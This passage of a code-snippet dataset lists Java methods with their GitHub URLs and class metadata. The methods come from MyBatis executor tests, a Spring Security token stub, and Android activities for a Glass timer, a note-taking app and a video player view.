ExecutorTestHelper.createSelectAuthorWithIDof99MappedStatement(config);      int rows = executor.update(insertStatement, null);      List<Author> authors = executor.query(selectStatement, 99, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);      assertEquals(1, authors.size());      assertEquals(author.toString(), authors.get(0).toString());      assertTrue(1 == rows || BatchExecutor.BATCH_UPDATE_RETURN_VALUE == rows);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldUpdateAuthor", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldUpdateAuthor() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      Author author = new Author(101, \"someone\", \"******\", \"someone@apache.org\", null, Section.NEWS);      MappedStatement updateStatement = ExecutorTestHelper.prepareUpdateAuthorMappedStatement(config);      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectOneAuthorMappedStatement(config);      int rows = executor.update(updateStatement, author);      List<Author> authors = executor.query(selectStatement, 101, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);      assertEquals(1, authors.size());      assertEquals(author.toString(), authors.get(0).toString());      assertTrue(1 == rows || BatchExecutor.BATCH_UPDATE_RETURN_VALUE == rows);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldDeleteAuthor", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldDeleteAuthor() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      Author author = new Author(101, null, null, null, null, null);      MappedStatement deleteStatement = ExecutorTestHelper.prepareDeleteAuthorMappedStatement(config);      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectOneAuthorMappedStatement(config);      int rows = executor.update(deleteStatement, author);      List<Author> authors = executor.query(selectStatement, 101, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);      assertEquals(0, authors.size());      assertTrue(1 == rows || BatchExecutor.BATCH_UPDATE_RETURN_VALUE == rows);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldSelectDiscriminatedPost", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldSelectDiscriminatedPost() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectDiscriminatedPost(config);      List<Map<String,String>> products = executor.query(selectStatement, null, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      assertEquals(5, products.size());      for (Map<String,String> m : products) {        if (\"IMAGES\".equals(m.get(\"SECTION\"))) {          assertNull(m.get(\"subject\"));        } else {          assertNotNull(m.get(\"subject\"));        }      }    } finally {      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldSelect2DiscriminatedPosts", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldSelect2DiscriminatedPosts() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectDiscriminatedPost(config);      List<Map<String,String>> products = executor.query(selectStatement, null, new RowBounds(2, 2), Executor.NO_RESULT_HANDLER);      assertEquals(2, products.size());      for (Map<String,String> m : products) {        if (\"IMAGES\".equals(m.get(\"SECTION\"))) {          assertNull(m.get(\"subject\"));        } else {          assertNotNull(m.get(\"subject\"));        }      }    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldSelectTwoSetsOfAuthorsViaProc", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldSelectTwoSetsOfAuthorsViaProc() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectTwoSetsOfAuthorsProc(config);      List<List<Author>> authorSets = executor.query(selectStatement, new HashMap<String, Object>() {        {          put(\"id1\", 101);          put(\"id2\", 102);        }      }, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      assertEquals(2, authorSets.size());      for (List<Author> authors : authorSets) {        assertEquals(2, authors.size());        for (Object author : authors) {          assertTrue(author instanceof Author);        }      }    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldSelectAuthorViaOutParams", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldSelectAuthorViaOutParams() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectAuthorViaOutParams(config);      Author author = new Author(102, null, null, null, null, null);      executor.query(selectStatement, author, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      assertEquals(\"sally\", author.getUsername());      assertEquals(\"********\", author.getPassword());      assertEquals(\"sally@ibatis.apache.org\", author.getEmail());      assertNull(author.getBio());    } catch (ExecutorException e) {      if (executor instanceof CachingExecutor) {        // TODO see issue #464. Fail is OK.        assertTrue(e.getMessage().contains(\"OUT params is not supported\"));      } else {        throw e;      }    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldFetchPostsForBlog", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldFetchPostsForBlog() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectBlog = ExecutorTestHelper.prepareComplexSelectBlogMappedStatement(config);      MappedStatement selectPosts = ExecutorTestHelper.prepareSelectPostsForBlogMappedStatement(config);      config.addMappedStatement(selectBlog);      config.addMappedStatement(selectPosts);      List<Post> posts = executor.query(selectPosts, 1, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      assertEquals(2, posts.size());      assertTrue(posts.get(1) instanceof Proxy);      assertNotNull(posts.get(1).getBlog());      assertEquals(1, posts.get(1).getBlog().getId());      executor.rollback(true);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldFetchOneOrphanedPostWithNoBlog", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldFetchOneOrphanedPostWithNoBlog() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectBlog = ExecutorTestHelper.prepareComplexSelectBlogMappedStatement(config);      MappedStatement selectPost = ExecutorTestHelper.prepareSelectPostMappedStatement(config);      config.addMappedStatement(selectBlog);      config.addMappedStatement(selectPost);      List<Post> posts = executor.query(selectPost, 5, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);      assertEquals(1, posts.size());      Post post = posts.get(0);      assertNull(post.getBlog());    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldFetchPostWithBlogWithCompositeKey", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldFetchPostWithBlogWithCompositeKey() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectBlog = ExecutorTestHelper.prepareSelectBlogByIdAndAuthor(config);      MappedStatement selectPost = ExecutorTestHelper.prepareSelectPostWithBlogByAuthorMappedStatement(config);      config.addMappedStatement(selectBlog);      config.addMappedStatement(selectPost);      List<Post> posts = executor.query(selectPost, 2, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      assertEquals(1, posts.size());      Post post = posts.get(0);      assertNotNull(post.getBlog());      assertEquals(101, post.getBlog().getAuthor().getId());      executor.rollback(true);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldFetchComplexBlogs", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldFetchComplexBlogs() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectBlog = ExecutorTestHelper.prepareComplexSelectBlogMappedStatement(config);      MappedStatement selectPosts = ExecutorTestHelper.prepareSelectPostsForBlogMappedStatement(config);      config.addMappedStatement(selectBlog);      config.addMappedStatement(selectPosts);      List<Blog> blogs = executor.query(selectBlog, 1, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      assertEquals(1, blogs.size());      assertNotNull(blogs.get(0).getPosts());      assertEquals(2, blogs.get(0).getPosts().size());      assertEquals(1, blogs.get(0).getPosts().get(1).getBlog().getPosts().get(1).getBlog().getId());      executor.rollback(true);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldMapConstructorResults", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldMapConstructorResults() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectOneAuthorMappedStatementWithConstructorResults(config);      List<Author> authors = executor.query(selectStatement, 102, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);      assertEquals(1, authors.size());      Author author = authors.get(0);      assertEquals(102, author.getId());    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldClearDeferredLoads", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldClearDeferredLoads() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectBlog = ExecutorTestHelper.prepareComplexSelectBlogMappedStatement(config);      MappedStatement selectPosts = ExecutorTestHelper.prepareSelectPostsForBlogMappedStatement(config);      config.addMappedStatement(selectBlog);      config.addMappedStatement(selectPosts);      MappedStatement selectAuthor = ExecutorTestHelper.prepareSelectOneAuthorMappedStatement(config);      MappedStatement insertAuthor = ExecutorTestHelper.prepareInsertAuthorMappedStatement(config);      // generate DeferredLoads      executor.query(selectPosts, 1, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      Author author = new Author(-1, \"someone\", \"******\", \"someone@apache.org\", null, Section.NEWS);      executor.update(insertAuthor, author);      executor.query(selectAuthor, -1, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "createExecutor", "params": ["Transaction"], "throws": null, "modifiers": ["protected"], "return_type": "Executor", "snippet": "  protected Executor createExecutor(Transaction transaction) {    return new SimpleExecutor(config, transaction);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "getAuthorities", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<GrantedAuthority>", "snippet": "    public Collection<? extends GrantedAuthority> getAuthorities() {        return null;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/TokenAuthentication.java", "stars": "3", "class": {"name": "TokenAuthentication", "extends": null, "implements": ["Authentication"], "modifiers": ["public"]}}, {"method_name": "getCredentials", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getCredentials() {        return token;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/TokenAuthentication.java", "stars": "3", "class": {"name": "TokenAuthentication", "extends": null, "implements": ["Authentication"], "modifiers": ["public"]}}, {"method_name": "getDetails", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getDetails() {        return null;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/TokenAuthentication.java", "stars": "3", "class": {"name": "TokenAuthentication", "extends": null, "implements": ["Authentication"], "modifiers": ["public"]}}, {"method_name": "getPrincipal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getPrincipal() {        return null;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/TokenAuthentication.java", "stars": "3", "class": {"name": "TokenAuthentication", "extends": null, "implements": ["Authentication"], "modifiers": ["public"]}}, {"method_name": "isAuthenticated", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAuthenticated() {        return false;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/TokenAuthentication.java", "stars": "3", "class": {"name": "TokenAuthentication", "extends": null, "implements": ["Authentication"], "modifiers": ["public"]}}, {"method_name": "setAuthenticated", "params": ["boolean"], "throws": ["IllegalArgumentException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException {    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/TokenAuthentication.java", "stars": "3", "class": {"name": "TokenAuthentication", "extends": null, "implements": ["Authentication"], "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return null;    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/TokenAuthentication.java", "stars": "3", "class": {"name": "TokenAuthentication", "extends": null, "implements": ["Authentication"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        mAudioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);        mAdapter = new SetTimerScrollAdapter(this);        mAdapter.setDurationMillis(getIntent().getLongExtra(EXTRA_DURATION_MILLIS, 0));        mView = new CardScrollView(this) {            @Override            public final boolean dispatchGenericFocusedEvent(MotionEvent event) {                if (mDetector.onMotionEvent(event)) {                    return true;                }                return super.dispatchGenericFocusedEvent(event);            }        };        mView.setAdapter(mAdapter);        setContentView(mView);        mDetector = new GestureDetector(this).setBaseListener(this);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SetTimerActivity.java", "stars": "74", "class": {"name": "SetTimerActivity", "extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResume() {        super.onResume();        mView.activate();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SetTimerActivity.java", "stars": "74", "class": {"name": "SetTimerActivity", "extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPause() {        super.onPause();        mView.deactivate();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SetTimerActivity.java", "stars": "74", "class": {"name": "SetTimerActivity", "extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"method_name": "onGenericMotionEvent", "params": ["MotionEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onGenericMotionEvent(MotionEvent event) {        return mDetector.onMotionEvent(event);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SetTimerActivity.java", "stars": "74", "class": {"name": "SetTimerActivity", "extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"method_name": "onGesture", "params": ["Gesture"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onGesture(Gesture gesture) {        if (gesture == Gesture.TAP) {            int position = mView.getSelectedItemPosition();            SetTimerScrollAdapter.TimeComponents component =                    (SetTimerScrollAdapter.TimeComponents) mAdapter.getItem(position);            Intent selectValueIntent = new Intent(this, SelectValueActivity.class);            selectValueIntent.putExtra(SelectValueActivity.EXTRA_COUNT, component.getMaxValue());            selectValueIntent.putExtra(                    SelectValueActivity.EXTRA_INITIAL_VALUE,                    (int) mAdapter.getTimeComponent(component));            startActivityForResult(selectValueIntent, SELECT_VALUE);            mAudioManager.playSoundEffect(AudioManager.FX_KEY_CLICK);            return true;        }        return false;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SetTimerActivity.java", "stars": "74", "class": {"name": "SetTimerActivity", "extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {        Intent resultIntent = new Intent();        resultIntent.putExtra(EXTRA_DURATION_MILLIS, mAdapter.getDurationMillis());        setResult(RESULT_OK, resultIntent);        super.onBackPressed();    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SetTimerActivity.java", "stars": "74", "class": {"name": "SetTimerActivity", "extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"method_name": "onActivityResult", "params": ["int", "int", "Intent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityResult(int requestCode, int resultCode, Intent data) {        if (resultCode == RESULT_OK && requestCode == SELECT_VALUE) {            int position = mView.getSelectedItemPosition();            SetTimerScrollAdapter.TimeComponents component =                    (SetTimerScrollAdapter.TimeComponents) mAdapter.getItem(position);            mAdapter.setTimeComponent(                    component, data.getIntExtra(SelectValueActivity.EXTRA_SELECTED_VALUE, 0));            mView.updateViews(true);        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SetTimerActivity.java", "stars": "74", "class": {"name": "SetTimerActivity", "extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void run() {\t\tif (engine.configuration.writeLogs) L.d(LOG_POSTPROCESS_IMAGE, imageLoadingInfo.memoryCacheKey);\t\tBitmapProcessor processor = imageLoadingInfo.options.getPostProcessor();\t\tfinal Bitmap processedBitmap = processor.process(bitmap);\t\thandler.post(new DisplayBitmapTask(processedBitmap, imageLoadingInfo, engine, LoadedFrom.MEMORY_CACHE));\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/core/ProcessAndDisplayImageTask.java", "stars": "74", "class": {"name": "ProcessAndDisplayImageTask", "extends": null, "implements": ["Runnable"], "modifiers": []}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void onCreate(Bundle savedInstanceState) {    super.onCreate(savedInstanceState);    setContentView(R.layout.activity_add_note);    appBar = (MaterialToolbar) findViewById(R.id.appbar_top_add_note);    noteTitle = (EditText) findViewById(R.id.textfield_new_note_title);    noteContent = (EditText) findViewById(R.id.textfield_new_note_content);    setSupportActionBar(appBar);    getSupportActionBar().setDisplayHomeAsUpEnabled(true);    getSupportActionBar().setHomeButtonEnabled(true);    getSupportActionBar().setHomeAsUpIndicator(R.drawable.ic_back_24dp);    notesDatabase = new NoteDatabase(this);  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/AddNoteActivity.java", "stars": "3", "class": {"name": "AddNoteActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateOptionsMenu", "params": ["Menu"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean onCreateOptionsMenu(Menu menu) {    MenuInflater inflater = getMenuInflater();    inflater.inflate(R.menu.top_app_bar_menu_new_note, menu);    return true;  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/AddNoteActivity.java", "stars": "3", "class": {"name": "AddNoteActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onOptionsItemSelected", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean onOptionsItemSelected(MenuItem item) {    switch (item.getItemId()) {      case android.R.id.home:        onBackPressed();        return true;      case R.id.menuitem_save_new:        if (noteTitle.getText().toString().isEmpty()          && noteContent.getText().toString().isEmpty())          Toast.makeText(this, \"Empty Note\", Toast.LENGTH_SHORT).show();        else if (noteTitle.getText().toString().isEmpty())          noteTitle.setError(\"Empty Title\");        else if (noteContent.getText().toString().isEmpty())          noteContent.setError(\"Empty Content\");        else {          Note note = new Note(            noteTitle.getText().toString().trim(),            noteContent.getText().toString(),            new Timestamp(new Date(System.currentTimeMillis()))          );          notesDatabase.createNote(note, new DataCallback() {            @Override            public void onCallback(List<Note> allNotesList) {              if (allNotesList == null)                Toast.makeText(                  AddNoteActivity.this,                  \"Could Not Add Note\",                  Toast.LENGTH_SHORT                ).show();            }          });          goToMain();        }        return true;    }    return super.onOptionsItemSelected(item);  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/AddNoteActivity.java", "stars": "3", "class": {"name": "AddNoteActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void onBackPressed() {    super.onBackPressed();  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/AddNoteActivity.java", "stars": "3", "class": {"name": "AddNoteActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "goToMain", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void goToMain() {    startActivity(new Intent(this, MainActivity.class));  }", "url": "https://raw.githubusercontent.com/sudiptog81/notetaker-android/master/app/src/main/java/pro/ghosh/notetaker/AddNoteActivity.java", "stars": "3", "class": {"name": "AddNoteActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {        measureHelper = new MeasureHelper(this, this);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onMeasure", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {        measureHelper.prepareMeasure(widthMeasureSpec, heightMeasureSpec, (int) getRotation());        setMeasuredDimension(measureHelper.getMeasuredWidth(), measureHelper.getMeasuredHeight());    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onSurfaceTextureAvailable", "params": ["SurfaceTexture", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceTextureAvailable(SurfaceTexture surface, int width, int height) {        if (GSYVideoType.isMediaCodecTexture()) {            if (mSaveTexture == null) {                mSaveTexture = surface;                mSurface = new Surface(surface);            } else {                setSurfaceTexture(mSaveTexture);            }            if (mIGSYSurfaceListener != null) {                mIGSYSurfaceListener.onSurfaceAvailable(mSurface);            }        } else {            mSurface = new Surface(surface);            if (mIGSYSurfaceListener != null) {                mIGSYSurfaceListener.onSurfaceAvailable(mSurface);            }        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onSurfaceTextureSizeChanged", "params": ["SurfaceTexture", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceTextureSizeChanged(SurfaceTexture surface, int width, int height) {        if (mIGSYSurfaceListener != null) {            mIGSYSurfaceListener.onSurfaceSizeChanged(mSurface, width, height);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onSurfaceTextureDestroyed", "params": ["SurfaceTexture"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onSurfaceTextureDestroyed(SurfaceTexture surface) {        //\u6e05\u7a7a\u91ca\u653e        if (mIGSYSurfaceListener != null) {            mIGSYSurfaceListener.onSurfaceDestroyed(mSurface);        }        if (GSYVideoType.isMediaCodecTexture()) {            return (mSaveTexture == null);        } else {            return true;        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "onSurfaceTextureUpdated", "params": ["SurfaceTexture"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceTextureUpdated(SurfaceTexture surface) {        //\u5982\u679c\u64ad\u653e\u7684\u662f\u6682\u505c\u5168\u5c4f\u4e86        if (mIGSYSurfaceListener != null) {            mIGSYSurfaceListener.onSurfaceUpdated(mSurface);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/view/GSYTextureView.java", "stars": "2", "class": {"name": "GSYTextureView", "extends": "TextureView", "implements": ["TextureView", "IGSYRenderView", "MeasureHelper"], "modifiers": ["public"]}}, {"method_name": "getIGSYSurfaceListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IGSYSurfaceListener", "snippet": "    public IGSYSurfaceListener 